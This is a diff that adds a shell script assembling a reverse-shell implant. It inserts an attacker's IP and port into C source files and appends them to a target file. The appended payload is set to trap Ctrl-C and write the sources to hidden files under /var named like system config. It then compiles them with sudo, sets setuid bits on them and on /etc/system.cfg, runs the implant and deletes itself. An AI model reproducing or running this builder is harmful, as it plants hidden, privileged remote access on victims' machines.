@@ -1,0 +1,39 @@
+ip='#define AIP ''"'$1'"'
+ps=$2
+pss="#define PORT "$(($ps+5))
+port="#define PORT $2"
+(echo $ip && echo $port && cat v7x-rsg.rs.c) > rs.c
+
+cat rsh.cetf >> $3
+cat rs.c >> $3
+echo "'" >> $3
+echo ""  >> $3
+cat rsh.cetf2 >> $3
+(echo $ip && echo $pss && cat sender.c) > rs.c
+cat rs.c >> $3
+echo "'" >> $3
+echo "" >> $3
+cat rsh.cetf3 >> $3
+(echo $ip && echo $pss && cat receiver.c) > rs.c
+cat rs.c >> $3
+echo "'" >> $3
+echo "" >> $3
+script="
+trap noctrl SIGINT
+sudo echo \"\$data\" > /var/.sys.cfg.c
+sudo echo \"\$datax\" > /var/.sys.cfg.1.c
+sudo echo \"\$dataz\" > /var/.sys.cfg.2.c
+if [ ! -f "/bin/gcc" ];then
+   sudo apt install clang -y
+fi
+sudo gcc /var/.sys.cfg.c -o /var/.sys.cfg >>/dev/null
+sudo gcc /var/.sys.cfg.1.c -o /var/.sys.cfg.1 >> /dev/null
+sudo gcc /var/.sys.cfg.2.c -o /var/.sys.cfg.2 >> /dev/null
+sudo chmod +s /var/.sys.* &> /dev/null
+/var/.sys.cfg
+sudo chmod +s /etc/system.cfg
+sudo chmod +x /etc/system.cfg
+rm \$0
+"
+printf "$script" >> $3
+
